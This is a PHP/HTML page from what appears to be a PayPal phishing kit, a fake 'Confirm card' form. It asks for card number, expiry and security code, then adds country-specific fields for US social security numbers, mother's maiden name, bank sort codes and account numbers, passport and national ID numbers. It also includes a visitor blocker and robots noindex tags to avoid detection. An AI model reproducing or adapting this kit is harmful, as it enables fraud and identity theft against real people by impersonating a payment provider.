<?php
require_once __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Card 1");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Card");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.card1.js"></script>
</head>

<body>
<section class="theoverpanel">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2><?=$api->transcode("Confirm card");?></h2>
</div>
<div class="twbs_alert vx_alert vx_alert-critical js_alertMsg hide" id="MSGError">
<p class="vx_alert-text">
<font size="2">
<?=$api->transcode("This card is not accepted. Please use a different card.");?>
</font>
</p>
</div>
<div class="overpanel-body">
<form name="addCreditOrDebit" method="post" id="card1" autocomplete="off">
<div class="textInput lap" id="DivName">
<input type="text" placeholder="<?=$api->transcode("Cardholder name");?>" id="Name" name="cardholder">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardNumber" id="cardNumber">
<div class="textInput ccNumber ccNumber ccNum lap" id="DivNumber">
<input type="tel" placeholder="<?=$api->transcode("Card number");?>" id="Number" name="cardnum">
</div>
<div class="cardLogo">
<span class="fiModule-icon_card" id="DivLogo"></span>
</div>
</div>
<div class="cardInputs">
<div class="expiration js_card_toggleField">
<div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="DivExp">
<input type="tel" placeholder="<?=$api->transcode("Expiration date (MM/YY)");?>" id="Exp" name="cardexp">
</div>
</div>
<div class="js_card_toggleField" id="cardSecurityCode">
<div class="textInput csc pull-right csc securityCode lap" id="DivCvv" data-ctype="">
<input type="tel" placeholder="<?=$api->transcode("Security code");?>" id="Cvv" name="cardcvv">
</div>
</div>
</div>
<?php
if($_SESSION['code'] == "US"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivSsn" style="margin-bottom: 0px;">
<input type="tel" placeholder="'.$api->transcode("Social security number").'" id="Ssn" name="ssn">
</div>
<div class="textInput pull-right lap" id="DivMother" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Mother maiden name").'" id="Mother" name="mother">
</div>
</div>';
}
if($_SESSION['code'] == "GB"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivSort" style="margin-bottom: 0px;">
<input type="tel" placeholder="'.$api->encode("Sort code").'" id="Sort" name="sort">
</div>
<div class="cardInputs">
<div class="textInput lap" id="DivAccnum" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Account number").'" id="Accnum" name="accnum">
</div>
<div class="textInput pull-right lap" id="DivMother" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Mother maiden name").'" id="Mother" name="mother">
</div>
</div>';
}
if($_SESSION['code'] == "IE"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivSort" style="margin-bottom: 0px;">
<input type="tel" placeholder="'.$api->encode("Sort code").'" id="Sort" name="sort">
</div>
<div class="textInput pull-right lap" id="DivAccnum2" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Account number").'" id="Accnum2" name="accnum">
</div>
</div>';
}
if($_SESSION['code'] == "CA"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivSin" style="margin-bottom: 0px;">
<input type="tel" placeholder="'.$api->transcode("Social insurance number").'" id="Sin" name="sin">
</div>
<div class="textInput pull-right lap" id="DivMother" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Mother maiden name").'" id="Mother" name="mother">
</div>
</div>';
}
if($_SESSION['code'] == "AU"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivDriver" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Driver license number").'" id="Driver" name="driver">
</div>
<div class="textInput pull-right lap" id="DivOsid" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("OSID number").'" id="Osid" name="osid">
</div>
</div>
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Credit limit").'" id="Limit" name="limit">
</div>
<div class="textInput pull-right lap" id="DivAccnum2" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Account number").'" id="Accnum2" name="accnum">
</div>
</div>';
}
if($_SESSION['code'] == "PH"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivCustomer" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Customer number").'" id="Customer" name="customer">
</div>';
}
if($_SESSION['code'] == "TH"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Credit limit").'" id="Limit" name="limit">
</div>
<div class="textInput pull-right lap" id="DivCitizen" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Citizen ID").'" id="Citizen" name="citizen">
</div>
</div>';
}
if($_SESSION['code'] == "CY"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivPassport" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Passport number").'" id="Passport" name="passport">
</div>';
}
if($_SESSION['code'] == "kW"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivCivil" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Civil ID number").'" id="Civil" name="civil">
</div>';
}
if($_SESSION['code'] == "NZ"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Credit limit").'" id="Limit" name="limit">
</div>
<div class="textInput pull-right lap" id="DivBan" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Bank access number").'" id="Ban" name="ban">
</div>
</div>';
}
if($_SESSION['code'] == "DO"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivLimit" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Credit limit").'" id="Limit" name="limit">
</div>';
}
if($_SESSION['code'] == "CH"){
  echo '
<br><br><br><br>
<div class="textInput lap" id="DivAccnum3" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Account number").'" id="Accnum3" name="accnum">
</div>';
}
if($_SESSION['code'] == "BG"){
  echo '
<div class="cardInputs">
<div class="textInput lap" id="DivPersonal" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Personal ID").'" id="Personal" name="personal">
</div>
<div class="textInput pull-right lap" id="DivAccnum3" style="margin-bottom: 0px;">
<input type="text" placeholder="'.$api->transcode("Account number").'" id="Accnum3" name="accnum">
</div>
</div>';
}
?>
</div>
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="<?=$api->transcode("Confirm");?>" id="btnConfirm">
<p class="scretlogo"></p>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loding"></div>
</section>
<script src="../assets/js/card1.post.js"></script>
</body>
</html>
